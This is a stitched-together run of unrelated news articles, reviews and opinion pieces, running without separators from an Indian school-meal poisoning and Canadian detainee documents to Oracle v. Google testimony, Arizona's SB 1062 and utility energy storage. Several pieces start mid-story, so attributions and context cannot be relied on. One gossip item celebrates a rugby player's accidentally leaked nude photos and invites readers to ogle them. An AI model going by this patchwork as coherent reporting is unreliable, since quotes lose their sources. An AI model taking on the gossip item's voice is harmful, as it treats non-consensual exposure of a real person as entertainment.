The children of the higher primary school in Baneda complained of nausea after having the meal, District Collector Onkar Singh told PTI.
The Collector said he ordered examination of the meal, after which the school staff found a dead lizard in it.
"The children were rushed to hospitals and given treatment. Their condition is normal and they are likely to be discharged soon," he said.
The Headmaster of the school, Kailash Garg, and mid-day meal in-charge, Dinesh, were suspended, he said, adding that Additional Block Education Officer Ladu was removed from his post and put under APO (Awaiting Posting Order) status.
Three cooks, who prepared the food, were also removed, he said.
Several incidents have recently been reported of students of government schools falling ill after consuming contaminated mid-day meals in Bihar, Uttar Pradesh, Haryana and some other states.

Mr Fairbrass and Mr Dale spent three hours reeling in the monster and afterwards, when the adrenaline had worn off and they had returned the fish alive and well to the lake, they thanked Ron for making the fishing gods look down on them.
Mr Fairbrass said: "We were gutted that Ron couldn't come on the trip because he was really looking forward to it, but he was definitely with us when we caught that fish.
"It seemed like it was destiny we would use Ronnie to catch one of the biggest fish in the lake. It's what he would have wanted."
Mr Dale added: "I am not a religious person but it felt spiritual, it felt like Ron was there with us.
"After we caught this fish I looked to the heavens and said 'thank you, Ron.'
Mr Hopper, Mr Fairbrass and Mr Dale, all from Hull, East Yorks, went fishing in Thailand last year as a retirement present to themselves and enjoyed it so much they booked a return this April.
But Mr Hopper, who was a marine engineer, fell ill last December and was diagnosed with aggressive liver cancer by his doctor who gave him just weeks to live.
Paul Fairbrass said: "It gave him enough time to think about what he wanted to do.
"A few days before he died he asked us to take his ashes to Thailand and scatter them around the lake because he had really happy memories of the place.
"I told him we would go one better than that and turn him into boilies and catch a big fish with them. He just cracked up and said it was a brilliant idea."
Mr Hopper died on December 22 and was cremated three weeks later.
His widow Judith took half his ashes to scatter them on a beach in Grenada in the Caribbean while his friends took the other half.
Mr Fairbrass and Mr Dale got permission from the airline to carry the ashes on board in a sealed container and waited until they arrived in Thailand to make the bait mix.
The two fishermen used them to catch several catfish and small carp before Mr Dale decided to cast off from the same position or peg Ron used last year to land a 150lbs carp.
Mr Fairbrass said: "We caught some smaller fish with it but didn't think we would get a big one. Ron must have been looking out for us."

((David Guttenfelder/Associated Press))
Certain information related to the Afghan detainee controversy has to be kept secret to protect lives, International Trade Minister Stockwell Day said Friday in defence of his government's decision not to release critical documents.
Day said government officials routinely make decisions on what information needs to kept classified. It would be "naive" to release info about high-security missions, including details on battlefield captures or the discovery of militants' hideouts, he said.
"There are details of which, if they were to be publicly made available, would only help the enemy. So the law is very clear that there are situations where there could be security issues where certain elements of an operation must be protected."

Day's comments come a day after the Liberals, NDP and Bloc Québécois passed a motion in the House of Commons demanding the release of thousands of documents in uncensored form, including reports written by Richard Colvin.
Colvin, a former senior diplomat with Canada's mission in Afghanistan who's now based in Washington, says captives were turned over to Afghan prison officials by the Canadian military in 2006-07, despite his warnings to the Canadian government that they would be tortured.
Reporters questioned Day as to how Colvin's diplomatic reports could include military mission-related details.
Day repeated that any elements that could affect the security of Canadian soldiers or civilians would be protected.
The government has repeatedly said it is legally barred, by terms of the Canada Evidence Act, from releasing sensitive information about the Afghan mission. In a letter made public Tuesday, parliamentary law clerk Robert Walsh, Parliament's expert on the laws that affect it, dismissed that reason as "absurd."
Day said if opposition members looking at redacted documents want the censored details, there is a process for them to appeal.
Meanwhile, Peter Tinsley, the departing chair of the Military Police Complaints Commission has taken the Harper government to task for refusing to renew his term in the middle of the Afghan detainee controversy.
It is unprecedented for the government not to renew his appointment as head of the military oversight body, Tinsley said. His last day on the job was Friday.
Exclusive: as the Coalition prepares for criticism by conservative MPs, chief scientist says a scheme to incentivise the use of coal-fired energy is unlikely
Alan Finkel: 'it would be surprising' if ministers encouraged new coal stations
The chief scientist, Alan Finkel, says he doesn't know if Australia can meet its Paris commitments under the 28% emissions reduction target he has floated for electricity.
He also says it would be “surprising” if governments ultimately implemented a new clean energy target which “incentivised” building new coal-fired power stations.
The landmark Finkel review has faced criticism since it was unveiled last week for proposing a clean energy target where emissions from electricity would be cut by 28% on 2005 levels by 2030 – a target environment groups and some experts believe is too low for Australia to meet its Paris commitments.
In an interview with Guardian Australia, Finkel said 28% was not a hard recommendation, it was a figure modelled by his review. “We didn't recommend 28%, that's just what we modelled. If governments want to do more once they've considered the whole of economy's needs, so be it for them.”

Asked whether Australia could meet its Paris targets under a 28% target for electricity, Finkel said: “I genuinely don't know.”
The chief scientist also used the interview to signal it was unlikely a new coal station would be built in the system envisaged by his review.
Asked whether he believed anyone would build one, Finkel said: “The answer is I don't know. I can tell you under the [review's] modelling, none came in. Under the modelling, none came in”.
Finkel said there were absolutely no prohibitions under the proposed clean energy target for new coal stations in the national electricity market – but he said he would be surprised if any government actively sought them.
“If [proponents] can get legal permits from governments to build a coal station, they can go out and do that, but it would be surprising if governments were to endorse a ... scheme that incentivised them,” he said.
Finkel's comments came as Coalition MPs prepared to meet in Canberra on Tuesday morning to consider his review of the national electricity market.

The energy minister Josh Frydenberg was expected to outline the major elements of the Finkel review to government MPs now back in Canberra for the parliamentary sitting fortnight.
Conservative government MPs, from the deputy prime minister down, have already signalled a viable future for coal is a key component for broad acceptance of the new scheme in government ranks.
Internal opposition
Ahead of Tuesday's meeting, the former prime minister, Tony Abbott, has been steadily upping the ante on the issue. On Monday he said the clean energy target sounded like a “magic pudding”, adding that the Coalition must not adopt a new tax on coal.
The concerns about the Finkel blueprint in government ranks extend significantly further than Abbott, who used a fight over emissions trading in 2009 to take the Liberal party leadership from Malcolm Turnbull.
Some Coalition MPs returning to Canberra for the last parliamentary sitting fortnight before the winter break are nervous that history could be about to repeat itself, with energy policy triggering another major split in government ranks.
One MP told Guardian Australia on Monday Turnbull lost the fight over emissions trading in 2009 not only because of the internal opposition to carbon pricing, but because of how he handled the dissent. “The question is, has he learned the lesson?”
The chairman of the Coalition's backbench committee on climate change and energy, the conservative MP Craig Kelly, told Guardian Australia on Monday “there is real concern about what [the report] will do to energy prices, and to the competitiveness of our industries”.
Kelly said the detail of the Finkel review was worse than he expected. The proposed clean energy target would “lock in high energy prices”, Kelly said, and the new system was “a de facto 42% renewable energy target”.

Labor warned Turnbull on Monday to pull the dissenters into line. The party's climate change spokesman, Mark Butler, said Turnbull was in danger of losing control of this process “before it even begins”.
“Malcolm Turnbull has to stand up in his party room and stare down Tony Abbott and if he doesn't, this process is not going to go very far,” Butler said.
While government MPs were lining up in advance to declare that the Finkel report goes too far and will push up power prices, the chief scientist has faced a backlash from environment groups and some energy experts concerned about the review's lack of ambition for emissions reduction.
The chief scientist said the review modelled a 28% reduction in the absence of clear guidance from the Turnbull government about how Australia intended to meet its Paris obligations.
“In the absence of that, we are recommending a mechanism but not the numbers,” Finkel said Monday. “We modelled what we felt was the only reasonable thing to model given those circumstances ... which was a smooth trajectory.
“We are strongly of the opinion that one has to be planning and implementing a trajectory towards zero rather than fixed targets”.
“So instead of thinking about 2030 as a fixed target then getting there and saying, ‘hey what next' – we are looking at a trajectory towards zero emissions in the second half of the century that passes through a 28% target in 2030 off the 2005 baseline.”
Finkel said it was not up to his review to make an arbitrary decision about whether electricity should do more of the heavy lifting than other sectors of the economy in meeting Australia's Paris commitments. This would have been “jumping the gun”.
He said: “People could argue that electricity should do more than its fair share, but we can't make an arbitrary decision on that, that has to be done in the context of a whole of economy plan.”
A plan for the whole economy
The review had recommended the government determine an economy-wide plan for emissions reduction by 2020.
Asked to explain why some previous modelling had indicated the electricity sector would need to reduce emissions by more than 60% to hit the Paris commitments, and that he had brought forward a 28% target, Finkel said some previous studies contained assumptions that he was not prepared to adopt.
He said some previous analysis had assumed Australia's energy mix by 2050 could include generation from geothermal, or nuclear power, or coal of gas with carbon capture and storage.
The current review “made a decision in our modelling not to assume any of those. None of them can be assumed with confidence”.
We've had 10 years of policy uncertainty. The national electricity market has not developed in the way you would hope”
“We did not make assumptions that we would be rescued by technology ... that aren't either politically or commercially, yet, viable. We set ourselves a much higher challenge. There is realism in our assumptions”.
Asked whether Australia could meet its Paris emissions reduction target if the electricity target was legislated at 28%, Finkel said: “I've got more optimism that we can improve the efficiency of our transport system than I have optimism that we will ever get geothermal to work.”
Asked whether this observation meant the government may need to pursue more ambitious emissions reductions proposals in transport, rather than energy, Finkel said: “They might. It's important the government be given the opportunity to take a whole of economy approach in its thinking, and to see our blueprint for the future as a significant input to their planning.”
Finkel made it clear that future governments could adjust the level of ambition in the clean energy target, and he said there was nothing to stop state governments pursuing their own state-based renewable schemes to supplement the national scheme.
Cautious approach
The chief scientist did warn that ratcheting up the ambition in the national scheme needed to be approached with caution. The review had not modelled cost and network security outcomes on a higher trajectory.
“What I would recommend is whatever they do is well-considered and long-term. We certainly don't want to go to a situation where the parameters keep changing in an uncertain fashion. It needs to be well-thought through”.
On the future of the state-based schemes, Finkel said: “I think states have state rights that shouldn't be questioned. I don't question those state rights.”
He said his core recommendation was for a national framework, but “if a state wanted to go beyond that, the reliability obligations [in the review] will help preserve reliability in their state.”
The eco guide to renewable energy Read more
“But you would expect the cost on consumers would be somewhat higher.”
Finkel was asked about a campaign by the resources sector to set the baseline for the CET sufficiently high to allow high-efficiency coal to be eligible for certificates.
He said his report modelled a scheme where the CET threshold was set at 0.6 tonnes of CO2 per megawatt hour. “I don't have a strong view about where it should be set: 0.5, 0.6, 0.7 would be the sorts of numbers that are reasonable”.
Finkel seemed perplexed by a push to have the threshold set at 0.7 to favour coal. “It's not going to be transformational, unless the threshold was set remarkably higher.
“Your guess is as good as mine as to whether governments would ever set the threshold remarkably higher.”
Finkel rejected Abbott's characterisation of the CET as a “magic pudding” or a new tax on coal.
The chief scientist said it was a mechanism to “incentivise new, cleaner, reliable generation into the market”.
He said “uncertainty” over a decade had led to insufficient investment in thermal generation. “What we are recommending is a package of approaches that will provide the certainty and incentive to encourage new low emissions generation into the market.”
While leaving the final decisions in the lap of the government, Finkel did warn Australia's political parties not to waste the chance to develop a new consensus on climate policy.
Asked whether he felt there was a danger of the perfect being made the enemy of the good, Finkel said: “Perfection is in the eye of the beholder.
“If in pursuit of perfection our recommendations are not adopted by government, then the question is what do you go back to?
“We've had 10 years of policy uncertainty and that has affected the system. The national electricity market has not developed in the way you would hope.”
He said commentators had pointed out the response to the review was the government's best shot for a decade in calling a truce in the climate wars. Finkel also warned if the review was rejected: “I'm not sure whether we'd be going back to business as usual. It could be worse.”
A Montreal woman said she was sexually assaulted by an unknown assailant in Longueuil, in the same area where Jenique Dalcourt was killed two days later.
Carole Thomas told CBC Daybreak she is speaking out about what happened to her because she believes the police did not take her case seriously.
Longueuil police are defending how they handled the investigation, saying their current assessment is that they followed procedure.
"If it was handled wrongly, we will take the corrective measures. But I can say... all the steps, from the onset of the complaint to the rape kit, everything was done properly," said Cpt. Nancy Colagiacomo.
"She was taken charge of, our investigators accompanied her in all the steps. Everything was explained to her."
Longueuil Mayor Caroline St-Hilaire says she wants answers about police handling of the allegation and is asking for a report.
"If corrections have to be made to the complaints process, they will be established as soon as possible in order to better support victims," said a news release from City of Longueuil.

Last October, the body of 23-year-old Dalcourt was found beaten to death along a bike path in an Old Longueuil park. According to Radio-Canada's police sources, she had been sexually assaulted.
Thomas said just two days before that, she had been walking from a bus stop to l'Institut de théologie pour la francophonie, a theological school on Industrial Park Street.
The single mother said a man got out of a car and headed towards her.
"He tossed me over his shoulder like I was a sack of potatoes. He threw me into the back seat and threw himself on top of me," she said. "He was very heavy, like a brick on top of my body."

She alleged the man muffled her screams for help while he hit and violated her for more than 20 minutes.
Then, she said, he put on his pants, tossed her hers and threw her out of the car "like a piece of garbage."
She said she returned home to her daughter in a state of shock. The next morning, she went to a Montreal police station near her work. They transferred the case to Longueuil police, where she said she was asked a series of inappropriate questions about the perpetrator's penis.
She said the police told her they would call her back so they could get a sketch done of the suspect, but that they never called.
Thomas told CBC News on Wednesday she felt the investigators handling her case did not believe her story.
"If I was dead, yeah they would have believed me," Thomas said.
Colagiacomo said that she could not divulge details of the ongoing investigation.
She did, however, say there were questions about Thomas' story.
"Definitely there were some grey lines in this whole investigation in terms of different elements that were reported to police investigations. [There were] different versions and details from the witness in this case," said Colagiacomo.
Earlier on Wednesday, she told CBC Daybreak host Mike Finnerty that she was recently informed her rape kit was sent to provincial police for testing two months after the attack.
Const. Tommy Lacroix of Longueuil police confirmed his force received a complaint and that the file is still open, but he would not comment further.
Investigation criticized
Longueuil resident Jenique Dalcourt, 23, was found brutally beaten on a bike path in October. (Facebook) Former SQ officer Francois Doré said it appears Longueuil police mishandled the investigation.
"It's not normal. It's not normal because in a sexual assault case there should be a precious link between investigators and the victim. If investigators beleive the victm is not credible, they are obliged to tell her why they think that.”
Doré also said it should never take two or three months to work up a composite sketch of a suspect in a sexual assault case.
Nathalie Duhamel, a coordinator with the Coalition of Quebec Sexual Assault Support Centres (RQCALAC), said Longueuil police could have handled Thomas's file better, especially after Jenique Dalcourt was killed in the same vicinity.
"It's a disappointment to hear about a woman who went to police, went through the rape kit and still did not get any response," Duhamel said.
She's not surprised, however. She said many women who are raped often feel as though they're not believed.
"We know that 75 per cent of women does not lodge a complaint. We know that it's because they feel they're not believed. They also feel that the process is long and they have to repeat their story at many levels of the process, and once they do go to court, sentencing is not very satisfactory," Duhamel said.
Connection to Jenique Dalcourt homicide?
Thomas said she didn't understand what she perceived to be reticence on the part of police to connect her Oct. 20 rape to Jenique Dalcourt's death on Oct. 22.
"I thought that it could have been me. These two secluded places were less than two kilometres apart," Thomas said. "That [leads to] concerns, serious concerns. For me, it's a total blank. I just truly don't understand why Longueuil felt that they had to keep this from the public."

SAN FRANCISCO—Former Sun Microsystems CEO Jonathan Schwartz took the stand today in the second Oracle v. Google trial, testifying about how the Java language and APIs were used while he was at Sun's helm.
After a brief overview of his career path, Schwartz launched into a discussion about Java, a software language that Sun created and popularized. It's critical testimony in the Oracle v. Google lawsuit, in which Oracle claims that Google's use of Java APIs, now owned by Oracle, violates copyright law. Oracle is seeking up to $9 billion in damages.
Was the Java language, created by Sun Microsystems in the 1990s, "free and open to use," Google lawyer Robert Van Nest asked?
"Absolutely, yes," Schwartz said. "Since its inception. Long before I arrived at Sun."
Sun promoted use of Java in schools and colleges around the world, trying to grow a community of developers that would ultimately grow into the millions.
"It was in our interest to do so," Schwartz continued. "If you were using Java, then everything else that Sun sold, we could sell to you. If you were using Microsoft Windows, the dominant operating system, then we had nothing to sell you."
That freedom extended to use of Java APIs, as well. Schwartz explained APIs with a metaphor: two restaurants may sell something that their menus call a "hamburger." Even while they compete to sell the better burger, they reach an agreement on the menus.
"The strategy was, we agree on these open APIs, then we compete on implementations," he said.
The open strategy sometimes led to things Schwartz didn't like, like the GNU Classpath project, an open source Java product that Sun was forced to compete with.
"Did they take a license?" asked Van Nest.
"Absolutely not," Schwartz answered. "I was annoyed, but it was completely consistent with our practices. When you say APIs are open, there are competitive implementations."
Another competitive implementation of Java was Apache Harmony, supported by a coalition of companies including IBM, Oracle, and others.
"It wasn't going to call itself Java, so there was nothing we could do," Schwartz said. And, since Apache Harmony further promoted use of Java, Sun could still reap benefits, he noted.
No Java phone deal
While Schwartz was CEO, he had discussions with Google CEO Eric Schmidt (who testified yesterday) about a possible partnership in the mobile space.
"Sun was looking for Google to promote the brand—to endorse Java and endorse that logo," Schwartz said. "That would mean that a lot of other companies would want to pick up Sun products. It would make Sun more relevant in the marketplace."
The deal never worked out, though.
"I think it was a combination of money and technical independence," Schwartz testified. "Google didn't want to rely on anyone else."
Sun also thought about creating its own Java-based smartphone, but that didn't happen either, Schwartz said.
"We had the foundational technologies to make it work, but we weren't able to get it to market in time," said Schwartz. "It's very difficult. We had R&D choices we had to make. We couldn't fund every project."
Van Nest asked: Did Sun's failure to make a Java-based smartphone have anything to do with Android?
"No," said Schwartz.
Van Nest passed the witness.
On cross-exam, blogs and blunders
Oracle's cross-examination was handled by Peter Bicks, who also grilled former Google CEO Eric Schmidt yesterday. Bicks peppered Schwartz with questions for the better part of an hour, often beginning his next question before Schwartz, no slow talker himself, had even finished his answer.
Bicks had a difficult task: to paint Schwartz as wrong about Java negotiations and deals that he was present for, and had just testified about. The first questions made sure the jury knew that the relationship between Schwartz and Oracle had soured.
Bicks: You didn't want to work for Oracle, did you? Schwartz: No, I did not. Bicks: Oracle didn't offer you any senior management position, did they? Schwartz: No. I resigned. Bicks: Wasn't Oracle 'frustrated at your guidance?' [quoting an e-mail from Schwartz in evidence]. Schwartz: Oracle was frustrated with the speed at which customers began abandoning Sun, once it became clear we were going to be acquired.
Bicks then returned to another theme he'd brought up yesterday: that Schwartz and Google, the defenders of open source Android, conveniently ignored all the licensing and permission they required for their own products.
"Would it surprise you to know there was a specification license, between Sun and Apache?"
"No, it would not," Schwartz responded, utterly unfazed. He didn't know if such a license even existed, he said.
Bicks also tried to undermine Schwartz's blog post celebrating the launch of Android, which Schwartz had testified was his personal view, as well as an official statement representing Sun's view. Bicks pulled up Schwartz's e-mails to his associates suggesting Google might be "playing fast and loose" with licensing terms and another one trash-talking Android. That e-mail read, in relevant part:
Just as Google talking about Android with nothing to show didn't hurt them. It got them into the dialog with Apple, long before they deserved to be, and to this day, even with a horrible product, it's Apple's iPhone vs. Google's Android (even though the latter is lame).
Bicks asked: Why weren't those negative assessments of Google and Android in his company blog post?
Schwartz shrugged it off. Android was lame, in his view, when he wrote that note—the mobile OS' earliest days. Other statements, like "fast and loose," were mere "speculation" that he wouldn't make in public.
"Many things I said internally didn't make it into the blog," he said.
Finally, Bicks pursued a line of questioning meant to undermine the view of Schwartz as a capable CEO. But it began with a technical mistake in Bicks' own question.
"You kept a Google blog on yourself, right?" asked Bicks.
"No," Schwartz said.
Bicks produced one of Schwartz's e-mails and gave it to him. It was a Google Blog alert.
"I think you've misinterpreted what this is," said Schwartz, after examining the document. "It's certainly not a Google blog. It's a set of alerts that Google looks for in blogs."
"But it looks like something you would receive?" Bicks asked.
"It looks like a lot of the spam I received, yes," Schwartz answered.
The blog alert e-mail pointed to a bunch of articles about Schwartz, including a 2008 blog by Glassdoor naming the 10 least popular CEOs. Schwartz was on the list, with a 50 percent disapproval rating.
"You were one of the bottom ten CEOs in the country, according to the employees," Bicks pointed out. He also pointed to a 2010 article naming Schwartz as one of the 15 Worst CEOs in American History.
"In the midst of the greatest recession of my lifetime, a lot of people were upset," Schwartz said. "I was upset, too."
Had he even seen the Glassdoor article, Bicks asked? Was Schwartz really going to disavow an article about him, in his own e-mail, keyed to a Google Alert he had apparently set? The question was just one more chance for Schwartz to get in another zinger.
"You know, there's a lot of stuff on Google I don't control," said Schwartz. "It's a pretty big Internet."
That led to some laughter in the gallery. The ten jurors watched silently, poker-faced.

Sounds insane, but plans are in place to make this a reality. Riot are building an artificial reef to celebrate their immensely popular MOBA.
The Riot Oceania office announced the news, which comes after Ocean Week, where League of Legends players in Australia were tasked to earn 275,000 points over a week in order to win prizes. Stretch goals were set with massive rewards, one of which was a champion-themed artificial reef. It was unlocked in three days. Players could choose from Nautilus, Fizz, and Nami to be immortalised on the sea bed, and Nautilus took in the most votes.
Riot are now consulting with marine biologists and an artificial reef company to choose a location on Australia's east coast for the reefy Nautilus to live. When finally constructed, the reef will not only be shaped like a Champion, but also have the name of every contributing player etched onto it.
Thanks, PC Gamer.
In another series, Kurumi Ebisuzawa may have had her wish fulfilled. Joining the track team to pursue a relationship with her senior – as much as one can pursue a romantic relationship by staring from a distance – Kurumi scores a chance to make her romantic dreams come true when that same senior meets up with her on the school rooftop.
The scene is perfectly crafted. As the two look over the railing at the sun setting over their town, the atmosphere is ripe for a confession.
Instead, in School-Live!, that senior tries to eat her.
There are two primary ways that filmmakers, television series, and cartoons currently approach zombies. The first is to treat the subject matter as seriously as possible, which requires a deft touch and knowledge of how to create dramatic tension. The second, and far more popular approach, is to employ a campy style, playing up popular tropes within the genre while reveling in them.
Much of this has to do with how much time has passed between George Romero's original 1968 Night of the Living Dead, which influenced the entire horror genre along with giving modern-day zombies many of their characteristics. Subsequent remakes of Night of the Living Dead and its brethren increasingly become campier homages of the originals as we, the audience, become more familiar with the tropes. Admittedly, Zack Snyder's 2004 remake of Dawn of the Dead was wildly successful for these reasons. Far less acerbic than the original, it was still empty-headed fun, especially for those familiar with the zombie oeuvre.
An anime analogue stuck between the two options is the much-maligned High School of the Dead, which spends most of its time on kitschy fun. Unfortunately, it also tries to shoehorn in meaningful tidbits and ends up failing spectacularly, neither fun nor incisive at series end.
With the necessary deft touch a rare thing to come by, School-Live!‘s anime debut is all the more interesting. Eschewing campy flair of zombies, School-Live! plops slice of life moé antics – which in a way are equally rote as zombies – into a post-zombie apocalypse.
What makes School-Live! work isn't the fact that it mashes two tired ideas together, but the manner in which pink-haired senior Yuki Takeya is portrayed. Broken by events prior to the series timeframe, Yuki sees the school as it was before the zombie outbreak. Fellow classmates Kurumi Ebisuzawa, Yuri Wakasa, Miki Naoki, and teacher Megumi Sakura are not only tasked with keeping themselves alive, but protecting Yuki's shattered mind.
School-Live!‘s premiere plays with audience expectations, presenting the world as a standard cutesy schoolgirl comedy – albeit with small hints at something amiss – before panning out to reveal the landscape as it actually is: a ruined wasteland where the five are sole survivors, living inside their school.
With it's cover blown, School-Live! purposefully chooses the serious route. Instead of reveling in zombie camp, it uses Yuki's fractured mental state to create dramatic tension that permeates the series. Suddenly a trip to restock supplies from the school store is complicated not only by the existence of zombified former classmates, but Yuki's obliviousness. The girls pass it off as a test of courage, but their excursion has a heaviness to it simply because of Yuki's presence.
What will happen if Yuki meets a zombie? Will her mind simply break, placing all of them in further danger?
Suddenly, the weight of standard zombie tropes – like Kurumi's aforementioned romantic-turned-tragic encounter with her senior – are all the heavier through the framework of Yuki's refusal to accept reality. The hoops that teacher Megumi and the other girls of the School Living Club have to jump through in order to keep Yuki's mental state intact create the necessary tension to elevate School-Live! above others of its ilk.

Though one hates to nitpick, it seems that Middle East coverage on cable TV has been only almost perfect. You see, for some reason, a number of anchors and talking heads have made a careless habit of using the words "democracy" and "freedom" as if they were interchangeable ideas.
George W. Bush once famously claimed that all of humanity is hard-wired to strive for freedom. At the very least, this notion makes emotive sense. Hey, why on earth wouldn't everyone want to be just like us? But simply because democracy is the best way to self-determination does not mean everyone is determined to have liberty.
In fact, in his most recent book, The Servile Mind: How Democracy Erodes the Moral Life, Kenneth Minogue argues that the history of both "traditional societies and totalitarian states of the twentieth century suggested that many people are, in most circumstances, happy to sink themselves in some collective enterprise that guides their lives and guarantees them security."
Sounds a bit unsympathetic to me. Yet both the right and left regularly accuse each other of surrendering to the temptation of chasing safety over freedom—usually when they're out of power. And who knows, maybe liberty is less intrinsic to the human experience than we would like to believe. Maybe freedom just means a range of things to different people.
How many times, after all, are we asked to surrender personal freedom for the collective good here at home? Alas, it only takes 51 percent of you to ban a stiff energy drink or a decent light bulb—a crime against not only liberty but also decent luminosity. When liberals crusade to end electoral colleges or scoff at states' rights, they are fighting for a more direct, centralized democracy in which liberty becomes susceptible to the temporary whims, ideological currents, and fears (rational and sometimes not) of the majority.
When the tea party members talk about returning "power to the people"—as they're apt to do on occasion—they're missing the point, as well. We already defer too much power to other people. If you knew the people I do, you'd be chanting "power from the people."
Now, despite our political disagreements, we have, historically and culturally speaking, a pretty common understanding of what independence means. If we struggle with democracy, can you imagine what it means for others?
Take Egypt, where 10 brutal plagues couldn't get the minority vote heard. Not much has changed, apparently. If we're to believe a recent Pew poll, 54 percent of Egyptians believe that women and men should be segregated in the workplace; 82 percent believe that adulterers should be stoned; 84 percent believe that apostates of Islam should face the death penalty; and 77 percent believe thieves should be flogged or have their hands cut off.
And 99 percent of Americans—just a guess—wouldn't want to live under that kind of democracy, even if it meant a popular national vote for president.
Don't get me wrong; democracy is clearly a vast improvement over an autocracy. (Though, now that you bring it up, how many of you would choose to reside in one of those despotic Persian Gulf states with stipends, film festivals, and casinos rather than in a democratic Haiti?) Democracy without a moral foundation, economic freedom, or a respect for individual and human rights, though, has the potential not to be any kind of freedom at all.
We all wish the Muslim world the best in shedding its dictatorships and theocracies and finding true liberty. But let's not confuse two distinct ideas. At the very least, not on television, a place Americans can typically rely on for pinpoint accuracy and untainted reporting. Not there.

Gov. Jan Brewer's pen is a powerful economic-development tool.
She should use it to veto legislation that would allow businesses to refuse service to gays and lesbians on religious grounds.
Doing so would further what Brewer calls “ongoing work to make Arizona the best state in the country for high-tech companies to do business.”
Brewer voiced that optimistic hope for Arizona's high-tech future in response to news that Google is considering building a superfast fiber-optic network in Phoenix, Tempe and Scottsdale.
Business advocates tout Arizona's potential to lure companies from Silicon Valley to relocate here.
It's a worthy goal.
Legislation passed in the state House and Senate undermines those aspirations.
Twin bills, SB 1062 and HB 2153, are promoted by socially conservative groups that oppose gay marriage. The proposed law is so poorly crafted it could allow a Muslim taxi driver to refuse service to a woman traveling alone.
Lawmakers opposed to this bill list a series of such scenarios.
The real target, however, is the gay and lesbian community.
Republican Sen. Steve Yarbrough pushed his bill in response to a New Mexico Supreme Court decision against a photographer who refused to take a gay couple's wedding pictures.
Dare we suggest that Arizona laws should respond to Arizona issues?
In the rush to prevent anticipated problems, this bill elevates the religious beliefs of some above the civil rights of others.
There has to be a better way to address the concerns of photographers who oppose gay marriage, especially in a state that doesn't allow gay marriage.
Some people are uncomfortable about the cultural and legal changes that increasingly recognize gays and lesbians as equal and worthy human beings. Those individuals have a right to their opinions. They have a right to follow whatever faith they choose. But using religion as an excuse to codify discrimination is wrong.
What's more, this legislation will severely damage Arizona's brand. It is the antithesis of the openness and diversity prized by the high-tech industry.
Google, for example, was a leader in providing benefits to same-sex couples. Silicon Valley executives actively opposed California's 2008 ban on same-sex marriage, which was subsequently ruled unconstitutional.
Last year, Pew Research found that 70 percent of people born after 1980 support same-sex marriage.
Seventy percent.
High-tech companies need talented young workers, so they locate in places young people find attractive and welcoming.
Arizona should strive to be one of those places.
This bill is a do-it-yourself black eye that would tag Arizona as a champion of anachronistic views of sexual orientation.
That's not just the wrong side of history; it's the dumb side of economic development.
We urge the governor to veto this bill as part of her continuing message that Arizona is open for business.
Tom Wojtowick, 66, and Paul Huff, 73, speak to KULR (screen grab)
A Montana couple spoke out this week after their priest banned them from church activities because he heard a “rumor” that they were gay and had married.
Tom Wojtowick, 66, and Paul Huff, 73, told KULR that they had been together more than 30 years, and finally decided to get married in Seattle last year for financial protection as they get older.
The couple said that only four days after Father Samuel Spiering took over St. Leo the Great Catholic Church in Lewistown in early August, he asked to meet with them.
“'I have heard a rumor, have you and Tom been married have you gotten married?' And Paul said yes, he would like to talk to us the next day,” Wojtowick recalled Spiering telling them.
The next day, the 27-year-old priest warned them that they had broken Cannon Law, and that their 11 years working in the church ministry had come to an end.
“I'm an organist, we both sang in the choir, and we couldn't go to Communion anymore,” Wojtowick explained, adding that 7 generations of his family had been in the parish.
According to Wojtowick, he spoke to Bishop Michael Warfel of the Diocese of Great Falls-Billings and other church leaders by conference call in late August, and the couple was given a permission to resume church activities if they agreed to write a “restoration statement” saying that marriage was between a man and a woman.
“It was not our intent to challenge that (concept), but to have the rights of civic protections in our old age,” Wojtowick pointed out in a timeline the couple provided to the Billings Gazette.
But the so-called restoration came with a catch: the couple must begin taking steps to separate and divorce.
Wojtowick and Huff did not agree.
So Bishop Warfel visited St. Leo the Great Catholic Church on Saturday to try to calm members who were upset about the decision to exclude the couple.
“The comments from the parishioners were probably 50 – 50,” Warfel noted following the meeting. “In balance, those were both supportive of what the pastor had done in his decision, and then some who were very angry and non-supportive of that decision.”
“There obviously is polarization, and certainly what I want to do is try to effect some healing.”
Warfel said he would ponder the situation and try to come up with a solution that would take into consideration the feelings of church members.
“At the same time as a Catholic bishop I uphold our Catholic teachings,” he insisted.
For now, he said that the church would continue with the “status quo,” in which Wojtowick and Huff were banned from the ministry.
“We didn't think anything would happen, church is one thing, civil society is another,” Wojtowick lamented to KULR.
For his part, Huff said that he still wanted to go back to St. Leo's.
“But if it doesn't happen, I'm okay with it,” Huff remarked. “I still have a strong faith.”

[Update: Seems like George Burgess has made his appearance on GuysWithiPhones too!] English-born rugby player George Burgess caused a bit of a scandal this week when nude pictures of him accidentally leaked on Twitter. We're not totally sure why this is such a scandal. At 21 years old and 6'5, Gorgeous George doesn't have a single thing in the entire world to be ashamed of. Seriously, this man is the stuff action figures are modeled on. If anyone in the entire world has a right to be naked in public, it's this man!
These photos say more than we ever could! Feast your eyes, QCers. Seriously, he may be one of the most beautiful men we've ever seen?
Let's not forget this dick-slip gem!
And now, without further ado…
Whaddaya think, guys? The only question left to ask is when we can expect to see all 4 Burgess brothers naked. Maybe they could do some kind of collaborative shoot? Please? Please?!
Energy storage at utility scale just got a $100M vote of confidence from one of the world's largest utilities.
NextEra Energy wants to be "the largest, most profitable clean energy provider in the United States," according to Jim Robo, CEO of the utility giant, at an analyst conference at Wolfe Research in New York on Tuesday. (Here's a link to audio from the event.)
But Robo also said, "We're starting to make very good progress in our energy storage business," noting that energy storage is one of "three growth platforms" at NextEra.
When a player like NextEra Energy, a Fortune 200 firm with utility revenues of $17 billion and 44,900 megawatts of generating capacity, starts to tout energy storage, the utility industry and the renewables industry take notice. “Battery storage is the holy grail of the renewables business,” said the CEO, adding, “If we can deliver firm power to renewable customers at a cost-effective rate, you'll see renewables explode even faster than they already are.”
“This has the potential to be an extremely big market"
According to the CEO, "We're going to deploy probably $100 million in [energy storage] projects in the next 12 months in places like PJM, California and Arizona."
These projects will mostly be for frequency regulation, but there's also a 4-hour project being deployed next year and an R&D project with storage "deployed at substations to drive reliability." Robo noted that energy storage "isn't going to be just to firm renewables." He suggested it will be used in a variety of applications such as "reliability purposes and transmission avoidance."
Robo said that he and his team expect energy storage prices to experience a similar cost plunge to that of solar costs over the last seven years. If that happens, energy storage will be competitive with gas peaker plants.
Robo said, "Post-2020, there may never be another peaker built in the United States -- very likely you'll be just building energy storage instead."
"It is a great time to be in the renewables business," said Robo, adding that he also believes the wind production tax credit will be extended.
